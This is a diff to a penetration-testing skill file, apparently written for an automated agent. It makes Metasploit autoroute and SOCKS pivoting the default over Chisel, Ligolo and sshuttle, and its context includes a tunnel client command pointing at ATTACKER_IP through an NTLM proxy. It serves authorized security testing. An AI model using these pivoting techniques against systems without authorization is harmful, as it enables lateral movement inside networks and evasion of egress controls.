@@ -108,7 +108,17 @@ pivot host runs unprivileged.
 
 ## Tool Selection Decision Tree
 
-Choose the right tool based on what's available:
+Choose the right tool based on what's available. **Check this first:** if the
+engagement's shell backend is Metasploit (`config.yaml shell.backend:
+metasploit` — the default whenever metasploit-framework is installed) and you
+already have, or can get, a Meterpreter session on the pivot host, use
+Metasploit's autoroute + SOCKS proxy (Step 9) instead of the tree below —
+zero footprint on the pivot host, no extra binary uploaded, every Metasploit
+module routes through it automatically. shell-mgr already does this natively
+for you if it owns the session (`[setup-pivot]` protocol); only fall through
+to the tree below if that's unavailable (shell-server-only access, or the
+Metasploit upgrade failed) or the destination needs a tool Metasploit can't
+reach the way you need (e.g. transparent subnet access, DNS/ICMP tunnels).
 
 ```
 What access do you have on the pivot host?
@@ -783,9 +793,13 @@ python client.py --server-ip ATTACKER_IP --server-port 9999 --ntlm-proxy-ip PROX
 **Use case:** Corporate environments with NTLM-authenticated proxies that block
 direct outbound connections.
 
-## Step 9: Metasploit Pivoting
+## Step 9: Metasploit Pivoting (default when shell.backend: metasploit)
 
-When using Metasploit for the overall engagement.
+Prefer this over every other method in this skill whenever the engagement's
+shell backend is Metasploit and a Meterpreter session exists on the pivot
+host — see the note at the top of the decision tree. Only use Chisel/Ligolo/
+sshuttle/etc. as the fallback (no Meterpreter session available, or this
+failed).
 
 ```bash
 # After getting a Meterpreter session
